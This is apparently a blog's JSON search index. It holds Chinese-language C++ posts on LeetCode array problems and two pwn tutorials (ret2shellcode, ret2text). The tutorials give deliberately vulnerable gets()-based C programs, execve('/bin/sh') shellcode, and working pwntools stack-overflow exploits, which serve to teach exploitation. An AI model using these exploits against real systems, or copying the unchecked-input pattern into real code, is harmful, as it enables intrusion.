[{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/cpp/","section":"Tags","summary":"","title":"Cpp","type":"tags"},{"content":" 长度最小的子数组 # 给定一个含有 n 个正整数的数组和一个正整数 s ，找出该数组中满足其和 ≥ s 的长度最小的 连续 子数组，并返回其长度。如果不存在符合条件的子数组，返回 0。\n示例：\n输入：s = 7, nums = [2,3,1,2,4,3] 输出：2 解释：子数组 [4,3] 是该条件下的长度最小的子数组。 提示：\n1 \u0026lt;= target \u0026lt;= 10 1 \u0026lt;= nums.length \u0026lt;= 10 1 \u0026lt;= nums[i] \u0026lt;= 10 暴力解法 # 依旧是 for 循环暴力求解\n警告 暴力解法已经超出时间限制\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution { public: int minSubArrayLen(int target, vector\u0026lt;int\u0026gt;\u0026amp; nums) { int min_length = INT_MAX; for (int i = 0; i \u0026lt; nums.size(); i++) { int sum = 0, length = 0; while (sum \u0026lt; target \u0026amp;\u0026amp; i + length \u0026lt; nums.size()) { sum += nums[i + length]; length++; } if (sum \u0026gt;= target \u0026amp;\u0026amp; length \u0026lt; min_length) { min_length = length; } } return min_length == INT_MAX ? 0 : min_length; } }; 复杂度：\n时间复杂度：\\(O(n^2)\\) 空间复杂度：\\(O(1)\\) 双指针法 # 利用双指针构建滑动窗口，动态选取子系列的范围，从而得到结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution { public: int minSubArrayLen(int target, vector\u0026lt;int\u0026gt;\u0026amp; nums) { int left = 0, right = 0; int sum = 0, minSubLength = INT_MAX; for (right = 0; right \u0026lt; nums.size(); right++) { sum += nums[right]; while (sum \u0026gt;= target) { int subLength = right - left + 1; // 计算子序列长度 minSubLength = (subLength \u0026lt; minSubLength) ? subLength : minSubLength; sum -= nums[left++]; // 变更滑动窗口起始位置 } } return minSubLength == INT_MAX ? 0 : minSubLength; } }; 复杂度：\n时间复杂度：\\(O(n)\\) 空间复杂度：\\(O(1)\\) 螺旋矩阵 II # 给定一个正整数 n，生成一个包含 1 到 n^2 所有元素，且元素按顺时针顺序螺旋排列的正方形矩阵。\n示例:\n输入：3 输出： 1 2 3 4 5 [ [ 1, 2, 3 ], [ 8, 9, 4 ], [ 7, 6, 5 ] ] 本题没有什么算法，就是模拟过程，考验对于代码的掌握能力。依照循环不变的逻辑，由外向内根据”右 -\u0026gt; 下 -\u0026gt; 左 -\u0026gt; 上“的规则构建螺旋矩阵：\n从左到右构建上面的边 从上到下构建右边的边 从右到左构建下面的边 从下到上构建左面的边 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; generateMatrix(int n) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; matrix(n, vector\u0026lt;int\u0026gt;(n, 0)); // 螺旋矩阵 int loop = n / 2; // 螺旋矩阵层数 int side = n; // 每层的边长 int i = 0, j = 0; // 循环的起始位置 int count = 1; // 起始值，1～n^2 while (loop--) { // 从左到右构建上边 for (size_t offset = 0; offset \u0026lt; side - 1; offset++) { matrix[i][j + offset] = count++; } j += side - 1; // 从上到下构建右边 for (size_t offset = 0; offset \u0026lt; side - 1; offset++) { matrix[i + offset][j] = count++; } i += side - 1; // 从右到左构建下边 for (size_t offset = 0; offset \u0026lt; side - 1; offset++) { matrix[i][j - offset] = count++; } j -= side - 1; // 从下到上构建左边 for (size_t offset = 0; offset \u0026lt; side - 1; offset++) { matrix[i - offset][j] = count++; } i -= side - 1; // 更新下一层循环的起始位置和边长 i++; j++; side -= 2; } if (n % 2) // 当 n 是奇数时，要单独对中心的位置赋值 { matrix[n / 2][n / 2] = count; } return matrix; } }; 区间和 # 给定一个整数数组 Array，请计算该数组在每个指定区间内元素的总和。\n暴力解法 # 直接根据给定的区间，把每个区间的数累加一遍。这种解法一旦进行大量的数据查询就会耗费大量的时间\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { int n, a, b; cin \u0026gt;\u0026gt; n; vector\u0026lt;int\u0026gt; vec(n); // 数组 for (int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; vec[i]; while (cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b) { int sum = 0; // 累加区间 a 到 b 的和 for (int i = a; i \u0026lt;= b; i++) sum += vec[i]; cout \u0026lt;\u0026lt; sum \u0026lt;\u0026lt; endl; } } 复杂度：\n时间复杂度：\\(O(n+nm)\\) 空间复杂度：\\(O(1)\\) 前缀和 # 在多次查询中，可以发现我们计算了许多重复的子数组，如果能重复利用计算过的子数组之和，就能大大降低计算中查询区间的次数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; using namespace std; int main() { int n, a, b; if (!(cin \u0026gt;\u0026gt; n)) return 0; // 前缀和: preVec[i] = sum of vec[0..i-1] vector\u0026lt;int\u0026gt; preVec(n + 1, 0); for (int i = 0; i \u0026lt; n; i++) { int x; cin \u0026gt;\u0026gt; x; preVec[i + 1] = preVec[i] + x; // 计算前缀和 } while (cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b) { int sum = preVec[b + 1] - preVec[a]; cout \u0026lt;\u0026lt; sum \u0026lt;\u0026lt; endl; } return 0; } 复杂度：\n时间复杂度：\\(O(n+m)\\) 空间复杂度：\\(O(1)\\) 开发商购买土地 # 在一个城市区域内，被划分成了 n * m 个连续的区块，每个区块都拥有不同的权值，代表着其土地价值。目前，有两家开发公司，A 公司和 B 公司，希望购买这个城市区域的土地。 现在，需要将这个城市区域的所有区块分配给 A 公司和 B 公司。 然而，由于城市规划的限制，只允许将区域按横向或纵向划分成两个子区域，而且每个子区域都必须包含一个或多个区块。 为了确保公平竞争，你需要找到一种分配方式，使得 A 公司和 B 公司各自的子区域内的土地总价值之差最小。 注意：区块不可再分。\n示例：\n输入：（第一行输入两个正整数，代表 n 和 m。 接下来的 n 行，每行输出 m 个正整数。） 1 2 3 4 3 3 1 2 3 2 1 3 1 2 3 输出：0（输出一个整数，代表两个子区域内土地总价值之间的最小差距。） 提示： 如果将区域按照如下方式划分：\n1 2 3 1 2 | 3 2 1 | 3 1 2 | 3 两个子区域内土地总价值之间的最小差距可以达到 0。\n思路 # 依旧采用前缀和的思路，在构建过程中计算出前缀区间和，再利用前缀和求分割区间\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;climits\u0026gt; using namespace std; int main() { int n, m; int minDiff = INT_MAX; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; preVec(n + 1, vector\u0026lt;int\u0026gt;(m + 1, 0)); // preVec[i][j] = sum of vec[0...i-1][0...j-1] for (size_t i = 0; i \u0026lt; n; i++) { for (size_t j = 0; j \u0026lt; m; j++) { int num; cin \u0026gt;\u0026gt; num; // 构建前缀和 preVec[i + 1][j + 1] = preVec[i + 1][j] + preVec[i][j + 1] - preVec[i][j] + num; } } // 横向分割 for (size_t i = 0; i \u0026lt; n; i++) { int diff = abs(preVec[n][m] - 2 * preVec[i + 1][m]); minDiff = diff \u0026lt; minDiff ? diff : minDiff; } // 纵向分割 for (size_t i = 0; i \u0026lt; m; i++) { int diff = abs(preVec[n][m] - 2 * preVec[n][i + 1]); minDiff = diff \u0026lt; minDiff ? diff : minDiff; } cout \u0026lt;\u0026lt; minDiff \u0026lt;\u0026lt; endl; return 0; } 复杂度：\n时间复杂度：\\(O(nm)\\) 空间复杂度：\\(O(1)\\) ","date":"2026-02-04","externalUrl":null,"permalink":"/posts/algo/keetcoder/day-02-array-part-part-02/","section":"Posts","summary":"本篇涵盖数组相关的几类经典技巧：用双指针/滑动窗口解决「长度最小的子数组」，通过循环不变式模拟生成「螺旋矩阵 II」，并从区间和暴力查询引出前缀和（含一维/二维前缀和）。最后用二维前缀和计算不同切分方式下的区域和，求开发商购买土地问题的最小差。","title":"Day 02 - 数组 Part 02","type":"posts"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/series/%E4%BB%A3%E7%A0%81%E9%9A%8F%E6%83%B3%E5%BD%95/","section":"Series","summary":"","title":"代码随想录","type":"series"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/categories/%E5%88%B7%E9%A2%98/","section":"Categories","summary":"","title":"刷题","type":"categories"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E5%89%8D%E7%BC%80%E5%92%8C/","section":"Tags","summary":"","title":"前缀和","type":"tags"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E5%8F%8C%E6%8C%87%E9%92%88/","section":"Tags","summary":"","title":"双指针","type":"tags"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","section":"Categories","summary":"","title":"数据结构","type":"categories"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E6%95%B0%E7%BB%84/","section":"Tags","summary":"","title":"数组","type":"tags"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/","section":"Tags","summary":"","title":"滑动窗口","type":"tags"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/categories/%E7%AE%97%E6%B3%95/","section":"Categories","summary":"","title":"算法","type":"categories"},{"content":" 数组是相同类型数据的集合\n下标从 0 开始 内存空间地址是连续的 数组元素无法删除只能覆盖 二分查找 # 要求有序数组 存在重复元素时返回下标可能不唯一 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution { public: int search(vector\u0026lt;int\u0026gt; \u0026amp;nums, int target) { int left, right; left = 0; right = nums.size() - 1; while (left \u0026lt;= right) // traget 在闭区间[left, right]中 { int mid = (left + right) / 2; int current = nums[mid]; if (current \u0026gt; target) { // traget 在左半边 right = mid - 1; } else if (current \u0026lt; target) { // traget 在右半边 left = mid + 1; } else { // current == traget return mid; } } return -1; } }; 复杂度：\n时间复杂度：\\(O(\\log(n))\\) 空间复杂度：\\(O(1)\\) 移除元素 # 给出一个数组 nums 和一个值 val，需要原地移除所有数值等于 val 的元素，并返回移除后数组的新长度。\n暴力解法 # 使用两层 for 循环，遇到目标元素就将后续元素移上来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Solution { public: int removeElement(vector\u0026lt;int\u0026gt;\u0026amp; nums, int val) { int n = nums.size(); // 当前待处理的数组长度 int k = 0; // 新数组长度 for (int i = 0; i \u0026lt; n; i++) { if (nums[i] == val) { // 发现目标元素将后续元素前移 for (int j = i; j \u0026lt; n - 1; j++) { nums[j] = nums[j + 1]; } i--; // 后续元素前移，i 也要向前移动一位 n--; // 移除一个元素，数组大小-1 } else { k++; } } return k; } }; 复杂度：\n时间复杂度：\\(O(\\log(n^2))\\) 空间复杂度：\\(O(1)\\) 快慢指针 # 通过快指针和慢指针在一个 for 循环中完成两个 for 循环的工作\n快指针：遍历所有元素，寻找新数组的元素 慢指针：指向新数组中末尾待更新元素的位置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution { public: int removeElement(vector\u0026lt;int\u0026gt;\u0026amp; nums, int val) { int fast, slow = 0; int n = nums.size(); for (fast = 0; fast \u0026lt; n; fast++) { if (nums[fast] != val) { // 需要保留不等于 `val` 的元素 if (fast != slow) // 只有双指针指向不同元素时才移动 nums[slow] = nums[fast]; slow++; // 更新慢指针，指向下一个需要被赋值的位置 } } return slow; } }; 复杂度：\n时间复杂度：\\(O(n)\\) 空间复杂度：\\(O(1)\\) 有序数组的平方 # 给你一个按非递减顺序排序的整数数组 nums，返回每个数字的平方组成的新数组，要求也按非递减顺序排序。\n暴力解法 # 每个数平方后再排序\n1 2 3 4 5 6 7 8 9 10 11 class Solution { public: vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) { for (int i = 0; i \u0026lt; nums.size(); i++) { nums[i] = pow(nums[i], 2); } sort(nums.begin(), nums.end()); // 快排 return nums; } }; 复杂度：\n时间复杂度：\\(O(n+n\\log(n))\\) 空间复杂度：\\(O(1)\\) 双指针 # 对于平方后数组，其实是有规律的。负数平方后就是正数，那么数组平方的最大值就在数组的两端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class Solution { public: vector\u0026lt;int\u0026gt; sortedSquares(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int n, left, right; vector\u0026lt;int\u0026gt; result(nums.size(), 0); n = nums.size() - 1; left = 0; right = nums.size() - 1; while(left \u0026lt;= right) { // 采用闭区间[left, right] int left_square = pow(nums[left], 2); int right_square = pow(nums[right], 2); if (left_square \u0026gt; right_square) { result[n] = left_square; left++; } else { result[n] = right_square; right--; } n--; } return result; } }; 复杂度：\n时间复杂度：\\(O(n)\\) 空间复杂度：\\(O(n)\\) ","date":"2026-02-04","externalUrl":null,"permalink":"/posts/algo/keetcoder/day-01-array-part-part-01/","section":"Posts","summary":"本文梳理数组的核心特性（0 索引、内存连续、不可删除只能覆盖），并讲解三道 LeetCode 数组题：二分查找、移除元素、以及有序数组平方。包含暴力与优化思路（快慢指针/双指针）、C++ 代码示例及时间与空间复杂度总结。","title":"Day 01 - 数组 Part 01","type":"posts"},{"content":"","date":"2026-02-04","externalUrl":null,"permalink":"/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/","section":"Tags","summary":"","title":"二分查找","type":"tags"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"Pwn","type":"categories"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"返回到 shellcode（return to shellcode）攻击。主要运用攻击者在堆栈上写入的 shellcode，然后覆盖程序的返回地址，控制程序的控制流返回到注入的 shellcode，从而执行恶意代码。通过以下代码为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char buf2[100]; int main(void) { setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); long page_size = sysconf(_SC_PAGESIZE); void *page_start = (void *)((long)buf2 \u0026amp; ~(page_size - 1)); // Linux 内核2.6.18-8后，默认不再同时具有可写与可执行的段。这种机制被称为\u0026#34;W^X\u0026#34;（Write XOR Execute） if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) { perror(\u0026#34;mprotect\u0026#34;); return 1; } char buf[100]; printf(\u0026#34;No system for you this time !!!\\n\u0026#34;); gets(buf); strncpy(buf2, buf, 100); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 使用 gcc 编译代码\n1 2 3 4 5 $ gcc -std=c99 \\ # 使用 C99 标准，C99 之后不支持 gets 函数 -no-pie \\ # 关闭地址随机化 -fno-stack-protector \\ # 关闭栈破坏检测 -z execstack \\ # 关闭栈不可执行 example.c -o example 可以看出程序存在栈溢出漏洞，输入的数据的前100个字节会被复制到 buf2， buf2 所处的页面被手动设置为可执行。可以在 buf2 中注入 shellcode，再覆盖程序返回地址将其指向 buf2.。以下是一个简单的 x86_64 汇编代码，用来调用 execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL)：\n; shellcode.s section .text ; 定义代码段（text section），存放可执行代码。 global _start ; 程序入口 _start: ; 将 \u0026#34;/bin/sh\\0\u0026#34; 压栈 xor rax, rax push rax ; \u0026#34;\\0\u0026#34;，字符串结束标志 mov rbx, 0x68732f2f6e69622f ; \u0026#34;/bin//sh\u0026#34;的 ascii 表示，使用小端法表示 push rbx ; 设置 execve 参数，根据64位系统的调用约定: ; RDI - 第一个参数 ; RSI - 第二个参数 ; RDX - 第三个参数 mov rdi, rsp ; Address of \u0026#39;/bin//sh\u0026#39; xor rsi, rsi ; argv = NULL xor rdx, rdx ; envp = NULL ; 调用 execve push 59 ; x86_64架构中，59是 execve 的系统调用编号 pop rax syscall ; 执行系统调用 使用 IDA 查看生成的 example 程序，可以看到输入的数据储存在栈上距离 rbp 0x80字节。buf2 位于 0x404080 处\n.bss:0000000000404080 public buf2 .bss:0000000000404080 ; char buf2[104] .bss:0000000000404080 buf2 db 68h dup(?) ; DATA XREF: main+5C↑o .bss:0000000000404080 ; main+C3↑o ------------------------------------------------------------------------------------ int __fastcall main(int argc, const char **argv, const char **envp) { char src[112]; // [rsp+0h] [rbp-80h] BYREF ...... puts(\u0026#34;No system for you this time !!!\u0026#34;); gets(src); strncpy(buf2, src, 0x64uLL); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 以下是利用 pwntools 编写的 wp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #!/usr/bin/env python3 # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#34;amd64\u0026#34;) exe = \u0026#34;./ret2shellcode\u0026#34; # Many built-in settings can be controlled on the command-line and show up # in \u0026#34;args\u0026#34;. For example, to dump all data sent/received, and disable ASLR # for all created processes... # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): \u0026#34;\u0026#34;\u0026#34;Start the exploit against the target.\u0026#34;\u0026#34;\u0026#34; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # Specify your GDB script here for debugging # GDB will be launched if the exploit is run via e.g. # ./exploit.py GDB gdbscript = \u0026#34;\u0026#34;\u0026#34; b main continue \u0026#34;\u0026#34;\u0026#34;.format(**locals()) # =========================================================== # EXPLOIT GOES HERE # =========================================================== io = start() # shellcode = asm(shellcraft.sh()) # pwntools 也提供许多内置的 shellcode shellcode = asm(\u0026#34;\u0026#34;\u0026#34; xor rax, rax push rax mov rbx, 0x68732f2f6e69622f push rbx mov rdi, rsp /* address of \u0026#34;/bin//sh\u0026#34; */ xor rsi, rsi /* argv = NULL */ xor rdx, rdx /* envp = NULL */ push 59 pop rax syscall \u0026#34;\u0026#34;\u0026#34;) buf2_addr = 0x404080 payload = shellcode.ljust(0x80 + 8, b\u0026#34;a\u0026#34;) + p64(buf2_addr) io.sendline(payload) io.interactive() ","date":"2024-06-02","externalUrl":null,"permalink":"/posts/pwn/stack_overflow/ret2shellcode/","section":"Posts","summary":"通过栈溢出注入shellcode劫持程序控制流。","title":"ret2shellcode","type":"posts"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/series/rop/","section":"Series","summary":"","title":"Rop","type":"series"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/rop/","section":"Tags","summary":"","title":"Rop","type":"tags"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/stack-overflow/","section":"Tags","summary":"","title":"Stack Overflow","type":"tags"},{"content":"返回到文本段（Return to text segment）攻击，这是一种利用程序中的可执行代码段（text segment）来执行恶意操作的攻击。这种技术有几个基本前提：\n程序中的某些代码位置是可预测的，同时在不同运行时是固定的 只需要利用程序的现有代码，无需注入新的代码 可以通过一个简单的例子说明这个问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // example.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int success() { puts(\u0026#34;called success()!\\n\u0026#34;); return system(\u0026#34;/bin/sh\u0026#34;); } void vuln() { char buf[32]; gets(buf); puts(buf); } int main() { vuln(); return 0; } 上述代码中的库函数 gets 是一个危险函数，通过以下给出的 gets 的一个实现，可以看出这个函数引起的严重问题。它从标准输入（stdin）读入一行，在遇到一个回车或某个错误时停止。gets 从不检查输入的长度，这导致它很容易被利用来进行栈溢出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* Read a newline-terminated string from stdin into S, removing the trailing newline. Return S or NULL. */ char * gets (char *s) { register char *p = s; register int c; FILE *stream = stdin; if (!__validfp (stream) || p == NULL) { __set_errno (EINVAL); return NULL; } if (feof (stream) || ferror (stream)) return NULL; while ((c = getchar ()) != EOF) if (c == \u0026#39;\\n\u0026#39;) break; else *p++ = c; *p = \u0026#39;\\0\u0026#39;; /* Return null if we had an error, or if we got EOF before writing any characters. */ if (ferror (stream) || (feof (stream) \u0026amp;\u0026amp; p == s)) return NULL; return s; } 通过 gcc 编译上述代码\n1 2 3 4 5 $ gcc -std=c99 \\ # 使用 C99 标准，C99 之后不支持 gets 函数 -no-pie \\ # 关闭地址随机化 -fno-stack-protector \\ # 关闭栈破坏检测 -z execstack \\ # 关闭栈不可执行 example.c -o example 可以利用 checksec 来检查编译出文件的安全性\n1 2 3 4 5 6 7 8 $ checksec example Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments 使用 IDA 反汇编程序，我们可以看到对应函数的汇编表示，\n; Attributes: bp-based frame public vuln vuln proc near s= byte ptr -20h ; __unwind { push rbp mov rbp, rsp sub rsp, 20h lea rax, [rbp+s] mov rdi, rax call _gets lea rax, [rbp+s] mov rdi, rax ; s call _puts nop leave retn ; } // starts at 40116A vuln endp 可以看出当程序运行时，vuln 函数在运行时的栈帧如下所示。如果提供大于32字节的数据时栈帧中保存的栈指针和返回地址。因此我们可以输入大于32字节的数据来覆盖返回地址，从而控制程序的执行流。\n1 2 3 4 5 6 7 8 9 | rsp | |:--------------:| | char buf[0] | | ... | | char buf[31] | |:--------------:| | rbp | |:--------------:| | return address | 以下是利用 pwntools 编写的 wp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * context(log_level=\u0026#39;debug\u0026#39;, arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) sh = process(\u0026#39;./example\u0026#39;) # gdb.attach(sh) success_addr = 0x401146 payload = b\u0026#39;a\u0026#39; * 0x20 # buf[32] payload += b\u0026#39;b\u0026#39; * 8 # rbp # 伪造返回地址，跳转到 nop ; ret，Ubuntu18及以上版本的系统要求在调用system函数时栈16字节对齐， # 即调用system函数时rsp的值必须是16的倍数，也就是末位为0，否则无法执行。这里多进行一次 rtn 以实现对齐 payload += p64(0x40112f) payload += p64(success_addr) # success 函数地址 sh.sendline(payload) sh.interactive() NOTE:\n上述代码中，没有立即跳转到 success() 的运行地址，这是源于 system() 函数运行时的栈16字节对齐要求。\n","date":"2024-06-01","externalUrl":null,"permalink":"/posts/pwn/stack_overflow/ret2text/","section":"Posts","summary":"通过栈溢出覆盖返回地址，跳转到text段中已存在的函数，从而劫持程序的控制流。","title":"ret2text","type":"posts"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/","section":"Blowfish","summary":"","title":"Blowfish","type":"page"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":" an example to get you started\nThis is a heading # This is a subheading # This is a subsubheading # This is a subsubsubheading # This is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\ntest1 test2 test22 test23 item1 item2 item3 item3a item3b We\u0026rsquo;re living the future so the present is our past.\ncode # 1 2 3 4 5 6 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello, world!\u0026#34;); return 0; } 1 print(\u0026#39;hello\u0026#39;) table # a b one two 3 4 math # $$ \\sum_{i=2}^ni=\\frac{n(n+1)}{2}-1 $$","date":"25 May 2024","externalUrl":null,"permalink":"/en/posts/test/hello_world/","section":"","summary":" ","title":"hello world","type":"posts"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/categories/test/","section":"Categories","summary":"","title":"Test","type":"categories"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/series/test/","section":"Series","summary":"","title":"Test","type":"series"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/test/","section":"Tags","summary":"","title":"Test","type":"tags"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/en/tags/welcome/","section":"Tags","summary":"","title":"Welcome","type":"tags"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"}]